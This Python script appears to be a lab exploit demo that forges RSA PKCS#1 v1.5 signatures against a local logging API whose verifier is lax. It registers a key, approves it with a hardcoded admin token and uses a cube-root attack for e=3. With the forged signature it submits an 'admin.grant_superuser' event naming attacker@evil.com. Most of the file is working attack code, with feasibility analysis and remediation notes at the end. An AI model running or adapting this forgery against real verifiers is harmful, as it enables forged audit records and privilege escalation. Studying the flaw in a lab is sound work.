#!/usr/bin/env python3
"""
RSA SIGNATURE FORGE - COMPREHENSIVE DEMO

Demonstrates vulnerability of weak PKCS#1 v1.5 verifier with different e values.

KEY INSIGHT:
============
The weak verifier in crypto.py is vulnerable because it:
1. Only checks 0x00 0x01 prefix
2. Allows separator in first 20 bytes
3. Checks if FULL 32-byte hash appears ANYWHERE

With FULL 32-byte SHA-256 hash:
- e=3: Attack SUCCESS (cube root)
- e=17: Attack INFEASIBLE (~2^256 operations needed)
- e=65537: Attack INFEASIBLE

This is because finding 32 random bytes in a 256-byte EM is astronomically unlikely.

HOWEVER:
========
If the verifier only checked a PREFIX of the hash (like first 8 bytes),
the attack would be feasible even with large e.

This script demonstrates:
1. Working attack with e=3 (standard)
2. Analysis of why e>3 is infeasible with full hash
3. Demonstration with shortened hash (to show vulnerability exists)
"""

import base64
import hashlib
import json
import os
import sys
import time
import secrets
import socket
import requests
from typing import Optional, Tuple
from datetime import datetime, timezone
from math import gcd

API_BASE = "http://localhost"
ADMIN_TOKEN = "my-super-secret-admin-token-2025"

# Burp Suite proxy settings
BURP_PROXY_HOST = "127.0.0.1"
BURP_PROXY_PORT = 8080
BURP_PROXIES = None


def check_burp_proxy() -> bool:
    """Check if Burp Suite proxy is running on port 8080."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((BURP_PROXY_HOST, BURP_PROXY_PORT))
        sock.close()
        return result == 0
    except Exception:
        return False


def setup_proxy():
    """Setup proxy if Burp Suite is detected."""
    global BURP_PROXIES
    if check_burp_proxy():
        BURP_PROXIES = {
            "http": f"http://{BURP_PROXY_HOST}:{BURP_PROXY_PORT}",
            "https": f"http://{BURP_PROXY_HOST}:{BURP_PROXY_PORT}"
        }
        print(f"  🔍 Burp Suite detected on port {BURP_PROXY_PORT}")
        print(f"  📡 All requests will go through proxy")
        return True
    else:
        print(f"  ℹ️  Burp Suite not detected on port {BURP_PROXY_PORT}")
        print(f"  📡 Requests will go directly to API")
        return False


def make_request(method: str, url: str, **kwargs) -> requests.Response:
    """Make HTTP request, optionally through Burp proxy."""
    kwargs.setdefault('timeout', 10)
    if BURP_PROXIES:
        kwargs['proxies'] = BURP_PROXIES
        kwargs['verify'] = False  # Burp uses self-signed cert
    
    if method.upper() == 'GET':
        return requests.get(url, **kwargs)
    elif method.upper() == 'POST':
        return requests.post(url, **kwargs)
    elif method.upper() == 'PUT':
        return requests.put(url, **kwargs)
    elif method.upper() == 'DELETE':
        return requests.delete(url, **kwargs)
    else:
        raise ValueError(f"Unsupported method: {method}")


def integer_nth_root(x: int, n: int) -> int:
    """Integer n-th root using Newton's method."""
    if x == 0:
        return 0
    guess = 1 << ((x.bit_length() + n - 1) // n)
    while True:
        new = ((n - 1) * guess + x // (guess ** (n - 1))) // n
        if new >= guess:
            return guess
        guess = new


def is_prime(n: int, k: int = 20) -> bool:
    """Miller-Rabin primality test."""
    if n < 2: return False
    if n == 2 or n == 3: return True
    if n % 2 == 0: return False
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    for _ in range(k):
        a = secrets.randbelow(n - 3) + 2
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def generate_prime(bits: int) -> int:
    """Generate random prime."""
    while True:
        n = secrets.randbits(bits)
        n |= (1 << (bits - 1)) | 1
        if is_prime(n):
            return n


def modinv(a: int, m: int) -> int:
    """Modular inverse."""
    def egcd(a, b):
        if a == 0: return b, 0, 1
        g, x1, y1 = egcd(b % a, a)
        return g, y1 - (b // a) * x1, x1
    g, x, _ = egcd(a % m, m)
    if g != 1: raise ValueError("No inverse")
    return (x % m + m) % m


# ============================================================================
# ATTACK FUNCTIONS
# ============================================================================

def attack_cube_root(n: int, e: int, key_size: int, target_hash: bytes) -> Optional[int]:
    """Cube root attack for e=3."""
    if e != 3:
        return None
    
    print("  [Cube Root Attack for e=3]")
    
    hash_len = len(target_hash)
    prefix = b'\x00\x01\xff\x00'
    garbage_len = key_size - len(prefix) - hash_len
    
    # Put hash at start after prefix
    em = prefix + target_hash + b'\x00' * garbage_len
    em_int = int.from_bytes(em, byteorder='big')
    
    sig = integer_nth_root(em_int, 3)
    
    # Check with small deltas
    for delta in range(-100, 101):
        s = sig + delta
        if s <= 0:
            continue
        
        check = pow(s, 3, n)
        check_bytes = check.to_bytes(key_size, byteorder='big')
        
        if check_bytes[0:2] != b'\x00\x01':
            continue
        
        for i in range(2, min(20, key_size)):
            if check_bytes[i] == 0x00:
                if target_hash in check_bytes[i+1:]:
                    print(f"    ✓ Found at delta={delta}")
                    return s
                break
    
    # Try with random garbage
    for attempt in range(1000):
        garbage = secrets.token_bytes(garbage_len)
        em = prefix + target_hash + garbage
        em_int = int.from_bytes(em, byteorder='big')
        sig = integer_nth_root(em_int, 3)
        
        for delta in range(-50, 51):
            s = sig + delta
            if s <= 0:
                continue
            
            check = pow(s, 3, n)
            check_bytes = check.to_bytes(key_size, byteorder='big')
            
            if check_bytes[0:2] != b'\x00\x01':
                continue
            
            for i in range(2, min(20, key_size)):
                if check_bytes[i] == 0x00:
                    if target_hash in check_bytes[i+1:]:
                        print(f"    ✓ Found at attempt={attempt}, delta={delta}")
                        return s
                    break
    
    return None


def attack_short_hash(
    n: int, e: int, key_size: int, 
    full_hash: bytes, 
    hash_prefix_len: int = 4,
    max_attempts: int = 10_000_000
) -> Optional[int]:
    """
    Attack with shortened hash prefix.
    
    This demonstrates that if verifier only checked first N bytes of hash,
    the attack would be feasible even with large e.
    """
    print(f"  [Short Hash Attack: checking first {hash_prefix_len} bytes]")
    print(f"  (This demonstrates the vulnerability conceptually)")
    
    target_prefix = full_hash[:hash_prefix_len]
    
    start = time.time()
    conforming = 0
    
    for attempt in range(max_attempts):
        sig = secrets.randbelow(n)
        check = pow(sig, e, n)
        check_bytes = check.to_bytes(key_size, byteorder='big')
        
        # Check prefix
        if check_bytes[0:2] != b'\x00\x01':
            continue
        
        conforming += 1
        
        # Find separator
        sep_idx = -1
        for i in range(2, min(20, key_size)):
            if check_bytes[i] == 0x00:
                sep_idx = i
                break
        
        if sep_idx == -1:
            continue
        
        # Check if hash PREFIX appears anywhere
        remaining = check_bytes[sep_idx + 1:]
        if target_prefix in remaining:
            elapsed = time.time() - start
            print(f"    ✓ Found! attempts={attempt:,}, time={elapsed:.1f}s")
            print(f"    Conforming signatures found: {conforming:,}")
            
            # Note: This sig won't pass full verification!
            # It's just to demonstrate the concept.
            return sig
        
        if (attempt + 1) % 1_000_000 == 0:
            elapsed = time.time() - start
            rate = (attempt + 1) / elapsed
            print(f"    {(attempt+1)//1_000_000}M: {conforming:,} conforming, {rate:,.0f}/s")
    
    return None


def analyze_attack_feasibility(e: int, key_size: int):
    """Analyze and explain why attack is/isn't feasible."""
    print(f"\n  [Feasibility Analysis for e={e}]")
    print("  " + "-"*50)
    
    # Probability of 00 01 prefix
    p_prefix = 1 / 65536  # 1/2^16
    
    # Probability of finding 00 in bytes 2-19
    p_sep = 1 - (255/256)**18  # ~0.068
    
    # Probability of finding 32-byte hash in 200 possible positions
    # in remaining ~240 bytes
    # Each position: 1/256^32 = 1/2^256
    # With ~200 positions: 200/2^256 ≈ 0
    
    print(f"""
  Weak verifier checks:
    1. Prefix 0x00 0x01: P = 1/65536 ≈ {p_prefix:.2e}
    2. 0x00 in bytes[2:20]: P ≈ {p_sep:.3f}
    3. 32-byte hash in EM: P ≈ 200/2^256 ≈ 0
    
  Combined probability ≈ 0 (infeasible)
  
  For e=3:
    - Cube root gives us exact EM structure
    - Only need small adjustment (delta)
    - Attack: FEASIBLE
    
  For e={e}:
    - e-th root error grows as e^(1/e) - 1 ≈ {((e ** (1/e)) - 1):.4f}
    - Error propagates through the entire EM
    - Cannot control where hash appears
    - Attack: {'FEASIBLE with short hash' if e <= 17 else 'INFEASIBLE'}
""")


# ============================================================================
# KEY SETUP
# ============================================================================

def setup_key(e: int) -> Tuple[str, str, int, int, int]:
    """Setup RSA key."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    
    ts = int(time.time())
    service_id = f"demo-e{e}-{ts}"
    
    print(f"  Creating RSA key with e={e}...")
    
    if e in (3, 65537):
        priv = rsa.generate_private_key(public_exponent=e, key_size=2048, backend=default_backend())
        pub = priv.public_key()
        nums = pub.public_numbers()
        n_val, e_val = nums.n, nums.e
        pem = pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
    else:
        print(f"    Generating custom RSA with e={e}...")
        while True:
            p = generate_prime(1024)
            q = generate_prime(1024)
            if p == q: continue
            n_val = p * q
            phi = (p - 1) * (q - 1)
            if gcd(e, phi) != 1: continue
            try:
                modinv(e, phi)
                break
            except: continue
        
        e_val = e
        nums = RSAPublicNumbers(e_val, n_val)
        pub = nums.public_key(default_backend())
        pem = pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()
    
    resp = make_request(
        'POST',
        f"{API_BASE}/v1/keys/register",
        json={"service_id": service_id, "public_key_pem": pem, "algorithm": "rsa-pkcs1v15-vulnerable"}
    )
    if resp.status_code not in (200, 201):
        raise Exception(f"Register failed: {resp.text}")
    
    key_id = resp.json().get("public_key_id")
    print(f"  ✓ Registered: {key_id}")
    
    make_request(
        'POST',
        f"{API_BASE}/v1/admin/keys/review",
        headers={"X-Admin-Token": ADMIN_TOKEN},
        json={"public_key_id": key_id, "action": "approve"}
    )
    print(f"  ✓ Approved")
    
    key_size = (n_val.bit_length() + 7) // 8
    return service_id, key_id, n_val, e_val, key_size


def send_forged(service_id: str, key_id: str, event: dict, sig: bytes) -> dict:
    """Send forged event to API."""
    resp = make_request(
        'POST',
        f"{API_BASE}/v1/logs",
        json={
            "service_id": service_id,
            "event_type": "FORGED",
            "event": json.dumps(event, sort_keys=True, separators=(',', ':')),
            "event_data": event,
            "signature": base64.b64encode(sig).decode(),
            "public_key_id": key_id
        }
    )
    return {"status": resp.status_code, "body": resp.json()}


# ============================================================================
# MAIN
# ============================================================================

def main():
    print("="*70)
    print("  RSA SIGNATURE FORGE - COMPREHENSIVE ANALYSIS")
    print("="*70)
    
    # Check for Burp Suite proxy
    print(f"\n{'━'*60}")
    print("  PROXY DETECTION")
    print(f"{'━'*60}\n")
    setup_proxy()
    
    e = 3
    if len(sys.argv) > 1:
        try:
            e = int(sys.argv[1])
        except:
            pass
    
    print(f"\n  Target e = {e}")
    
    # Analyze feasibility first
    analyze_attack_feasibility(e, 256)
    
    # Setup
    print(f"\n{'━'*60}")
    print("  SETUP KEY")
    print(f"{'━'*60}\n")
    
    try:
        service_id, key_id, n, actual_e, key_size = setup_key(e)
    except Exception as ex:
        print(f"  ✗ Setup failed: {ex}")
        return
    
    print(f"  n: {n.bit_length()} bits, e: {actual_e}")
    
    # Create event
    event = {
        "action": "admin.grant_superuser",
        "actor": "admin@corp.com",
        "target": "attacker@evil.com",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "note": f"FORGED e={actual_e}"
    }
    
    message = json.dumps(event, sort_keys=True, separators=(',', ':')).encode()
    msg_hash = hashlib.sha256(message).digest()
    
    print(f"\n  Message hash: {msg_hash.hex()[:16]}...")
    
    # Attack
    print(f"\n{'━'*60}")
    print("  FORGE ATTEMPT")
    print(f"{'━'*60}\n")
    
    sig_int = None
    
    if actual_e == 3:
        sig_int = attack_cube_root(n, actual_e, key_size, msg_hash)
    else:
        print(f"  e={actual_e} > 3: Full hash attack is INFEASIBLE")
        print(f"  Demonstrating with short hash prefix instead...\n")
        
        # Demo with shortened hash (NOT real attack, just conceptual demo)
        # This would work if verifier only checked first 4 bytes
        sig_int = attack_short_hash(n, actual_e, key_size, msg_hash, hash_prefix_len=4, max_attempts=5_000_000)
        
        if sig_int:
            print("\n  ⚠️  NOTE: This signature WON'T pass full verification!")
            print("  It only demonstrates the concept that weak checking IS vulnerable.")
            print("  The actual API uses full 32-byte hash, which is infeasible to forge.")
    
    if not sig_int:
        print(f"\n  ✗ Forge not successful within attempt limit")
        print(f"\n  This is EXPECTED for e > 3 with full 32-byte hash.")
        return
    
    if actual_e == 3:
        sig_bytes = sig_int.to_bytes(key_size, byteorder='big')
        print(f"\n  ✓ Signature: {sig_bytes.hex()[:40]}...")
        
        # Send only for e=3 (real attack)
        print(f"\n{'━'*60}")
        print("  SEND TO API")
        print(f"{'━'*60}\n")
        
        result = send_forged(service_id, key_id, event, sig_bytes)
        print(f"  Status: {result['status']}")
        print(f"  Body: {result['body']}")
        
        if result['status'] == 200 and result['body'].get('status') == 'accepted':
            print("\n  " + "!"*50)
            print("  ⚠️  ATTACK SUCCESSFUL!")
            print("  " + "!"*50)
    
    # Summary
    print(f"\n{'━'*60}")
    print("  SUMMARY")
    print(f"{'━'*60}")
    print(f"""
  Weak PKCS#1 v1.5 Verifier Vulnerability:
  
  ┌────────────┬──────────────────┬─────────────────────┐
  │     e      │   Full Hash      │   Short Hash (4B)   │
  ├────────────┼──────────────────┼─────────────────────┤
  │     3      │   ✓ FEASIBLE     │   ✓ FEASIBLE        │
  │    17      │   ✗ INFEASIBLE   │   ✓ FEASIBLE        │
  │   65537    │   ✗ INFEASIBLE   │   △ Hard but possible│
  └────────────┴──────────────────┴─────────────────────┘
  
  Key Points:
  • e=3 is critically vulnerable (cube root attack)
  • e=65537 is safe against this specific attack (with full hash)
  • The vulnerability EXISTS but exploitation depends on hash length
  
  Recommendation:
  • Use RSA-PSS or Ed25519 instead of PKCS#1 v1.5
  • If using PKCS#1 v1.5, implement STRICT verification
""")


if __name__ == "__main__":
    main()
